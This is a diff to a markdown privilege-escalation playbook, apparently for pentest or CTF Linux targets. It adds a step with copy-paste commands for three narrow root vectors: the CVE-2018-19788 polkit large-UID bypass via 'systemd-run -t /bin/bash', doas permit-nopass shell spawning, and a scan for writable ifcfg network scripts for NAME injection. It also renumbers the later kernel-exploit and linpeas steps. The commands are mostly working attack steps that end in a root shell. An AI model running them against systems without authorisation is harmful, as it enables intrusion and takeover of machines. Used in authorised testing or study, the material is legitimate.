@@ -582,9 +582,56 @@ All five exhausted with no elevation → proceed to Step 16.
 
 ---
 
-## Step 16 — Kernel exploits
+## Step 16 — Narrow-applicability vectors
 
-⚠️ Kernel exploits risk kernel panics — box may need reset. Run only after Steps 0–15 fall through.
+### CVE-2018-19788 — polkit UID>INT_MAX authentication bypass:
+
+On **target:**
+
+`test "$(id -u)" -gt 2147483647 && echo "BIG_UID: $(id -u)"; echo "BIG_UID_SCANNED"`
+
+Route on output markers:
+
+- `BIG_UID: <uid>` → run: `systemd-run -t /bin/bash`
+    - Interactive root shell prompt → verify root by running `id` → `uid=0(...)` → root authority achieved. Done.
+    - GLib assertion error / SELinux denial / `command not found` → payload blocked (patched polkit, SELinux enforcing `user_t`, or `systemd-run` absent). Proceed to next narrow-vector check.
+- `BIG_UID_SCANNED` with no preceding `BIG_UID` → INAPPLICABLE, proceed to next narrow-vector check.
+- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.
+
+### DOAS entitlements:
+
+On **target:**
+
+`command -v doas >/dev/null 2>&1 && test -f /etc/doas.conf && echo "DOAS_INSTALLED"; echo "DOAS_SCANNED"`
+
+Route on output markers:
+
+- `DOAS_INSTALLED` → run trivial permit-nopass check across common shell paths:
+
+     `for s in /bin/sh /bin/bash /bin/ksh /bin/dash /bin/zsh /bin/ash; do [ -x "$s" ] && [ "$(doas -C /etc/doas.conf "$s" 2>/dev/null)" = "permit nopass" ] && echo "DOAS_NOPASS_SHELL: $s" && break; done; echo "DOAS_SHELL_SCANNED"`
+
+    - `DOAS_NOPASS_SHELL: <shell>` → run `doas <shell>` → interactive root shell → verify root by running `id` → `uid=0(...)` → root authority achieved. Done.
+    - `DOAS_SHELL_SCANNED` with no preceding `DOAS_NOPASS_SHELL` → no trivial shell catch; route to [[Sudo Shell Escape]] - doas branch (**doas branch note NOT yet built**, see [[Sudo Shell Escape DOAS Unification]]; refactor deferred to build-when-encountered).
+- `DOAS_SCANNED` with no preceding `DOAS_INSTALLED` → INAPPLICABLE, proceed to next narrow-vector check.
+- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.
+
+### ifcfg-* NAME injection (CentOS/RHEL network-scripts):
+
+On **target:**
+
+`test -d /etc/sysconfig/network-scripts && find -L /etc/sysconfig/network-scripts -maxdepth 1 -type f -name 'ifcfg-*' -writable -printf 'IFCFG_WRITABLE: %p\n' 2>/dev/null; test -w /etc/sysconfig/network-scripts && echo "IFCFG_DIR_WRITABLE: /etc/sysconfig/network-scripts"; echo "IFCFG_SCANNED"`
+
+Route on output markers:
+
+- `IFCFG_WRITABLE: <file>` OR `IFCFG_DIR_WRITABLE: <dir>` → [[ifcfg NAME Injection]] (walkthrough not built — see [[ifcfg NAME Injection Walkthrough]] design note; deferred to build-when-encountered).
+- `IFCFG_SCANNED` with no preceding `IFCFG_WRITABLE` or `IFCFG_DIR_WRITABLE` → INAPPLICABLE, proceed to Step 17.
+- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.
+
+---
+
+## Step 17 — Kernel exploits
+
+⚠️ Kernel exploits risk kernel panics — box may need reset. Run only after Steps 0–16 fall through.
 
 `uname -r`
 
@@ -599,7 +646,7 @@ From the populated files, identify and record `<distro>` (e.g. Debian, Ubuntu, R
 
 ---
 
-## Step 17 — Automated enumeration (linpeas)
+## Step 18 — Automated enumeration (linpeas)
 
 ⚠️ Maximum IOC. Comprehensive backstop.
 
@@ -629,7 +676,7 @@ Focus on red+yellow flagged findings. Route each finding back to the appropriate
 
 ## Exhaustion
 
-All eighteen steps fall through:
+All nineteen steps fall through:
 
 1. Re-review `linpeas.out` for less-common findings (kernel keyring, polkit, dbus, custom services).
 2. Deeper enum on app-specific artefacts: `/var/spool/`, `/var/backups/`, `/opt/`, `/srv/`.
